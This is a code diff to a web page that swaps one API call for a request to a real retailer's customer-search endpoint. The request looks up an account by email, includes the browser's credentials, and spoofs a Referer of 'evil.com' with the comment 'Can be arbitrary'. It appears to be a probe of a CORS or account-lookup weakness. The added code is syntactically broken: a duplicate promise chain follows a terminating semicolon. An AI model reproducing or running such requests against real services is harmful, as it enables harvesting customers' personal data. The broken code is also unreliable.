@@ -18,17 +18,28 @@
     function fetchStoreKey() {
       document.getElementById("output").textContent = "⏳ Fetching...";
 
-      fetch("https://api-prod.retailsso.com/v1/instorecompanion/getstorekey?latitude=0&longitude=0", {
-        method: "GET",
-        headers: {
-          "Appid": "Web",
-          "Langcode": "en",
-          "Referer": "https://instore.carrefouruae.com",
-          "Env": "prod",
-          "Lang": "en",  // No injection
-          "Storeid": "mafuae"
-        }
-      })
+      fetch("https://www.carrefouruae.com/v2/customers/channel/search?email=fohof13749%40modirosa.com", {
+  method: "GET",
+  headers: {
+    "Appid": "Reactweb",
+    "Areacode": "DubaiFestivalCity-Dubai",
+    "Env": "prod",
+    "Lang": "en",
+    "Langcode": "en",
+    "Newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjMzNTU3MjAiLCJhcCI6Ijk3Njc0NDUxOCIsImlkIjoiYmFmMjgyYjUwNDVjYWRlZCIsInRyIjoiMmIwYmVmYTUxZGI1MDE3MmQzYjdlYzBkZTJmNThmMjAiLCJ0aSI6MTc1MzEwMTQwNjMwN319",
+    "Posinfo": "express=003_Zone01,QELEC=003_Zone01,food=072_Zone01,nonfood=099_Zone01",
+    "Storeid": "mafuae",
+    "Traceparent": "00-2b0befa51db50172d3b7ec0de2f58f20-baf282b5045caded-01",
+    "Tracestate": "3355720@nr=0-1-3355720-976744518-baf282b5045caded----1753101406307",
+    "Referer": "https://evil.com",  // Can be arbitrary
+  },
+  credentials: "include", // Required if cookies/session tokens needed
+  mode: "cors"
+})
+.then(res => res.text())
+.then(console.log)
+.catch(console.error);
+
       .then(response => response.text())
       .then(data => {
         document.getElementById("output").textContent = data;
